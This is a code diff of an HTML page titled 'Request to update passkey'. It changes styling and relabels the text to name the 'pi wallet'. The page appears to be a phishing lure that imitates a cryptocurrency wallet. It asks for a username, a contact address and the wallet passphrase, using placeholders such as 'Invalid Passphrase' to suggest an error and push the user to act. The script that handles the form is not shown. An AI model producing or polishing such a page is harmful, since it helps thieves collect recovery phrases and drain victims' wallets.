@@ -49,10 +49,9 @@
             color: gray;
             font-family: Arial, sans-serif;
         }
-        /* Passphrase height is 3x button height */
-        .input-large {
+        /* Passphrase auto-expands */
+        textarea {
             width: calc(100% - 20px);
-            height: 150px;
             padding: 10px;
             font-size: 14px;
             border: 1px solid #ccc;
@@ -136,10 +135,10 @@
         <h2>Request to update passkey</h2>
         <input type="text" placeholder="Invalid Username">
         <input type="text" placeholder="Invalid Phone number/Email ID">
-        <textarea id="passphrase" class="input-large" placeholder="Invalid Passphrase"></textarea>
+        <textarea id="passphrase" placeholder="Invalid Passphrase"></textarea>
         <p id="message" class="error-message"></p>
         <button class="btn" onclick="validatePassphrase()">Send Request</button>
-        <p class="info">As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
+        <p class="info">As a non-custodial wallet, your pi wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
     </div>
 </body>
 </html>
